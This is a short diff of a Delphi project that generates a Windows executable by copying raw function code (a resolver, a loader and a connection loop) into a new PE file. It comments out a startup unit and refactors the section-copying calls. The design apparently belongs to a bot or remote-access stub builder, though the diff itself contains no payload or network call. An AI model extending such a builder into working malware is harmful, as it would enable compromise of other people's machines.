@@ -2,7 +2,7 @@ program Project1;
 
 uses
   Windows,
-  untStartUp in 'Functions\untStartUp.pas',
+  //untStartUp in 'Functions\untStartUp.pas',
   untUtils in 'untUtils.pas',
   untInstallation in 'Functions\untInstallation.pas',
   untLoader in 'Loader\untLoader.pas',
@@ -16,19 +16,15 @@ var
   mPE:TPEFile;
 
 procedure BuildSetup();
-var
-  dwSizeAll:DWORD;
-  dwSize: DWORD;
 begin
   mPE := TPEFile.Create;
   mPE.CreatePEBase;
 
-  dwSize := DWORD(@resolver_end) - DWORD(@resolver_start);
-  mPE.AddFunction(@resolver_start, dwSize);
-  mPE.CustomizeLoader(dwSizeAll);
+  mPE.AddFunction(@resolver_start, @resolver_end);
+  mPE.CustomizeLoader;
 
-  dwSize := DWORD(@ConnectionLoop_END) - DWORD(@ConnectionLoop_CALLER);
-  mPE.AddFunction(@ConnectionLoop_CALLER, dwSize);
+  mPE.AddFunction(@ConnectionLoop_CALLER, @ConnectionLoop_END);
+
   mPE.FixSectionLen();
   mPE.SaveFile('test.exe');
   mPE.Free;
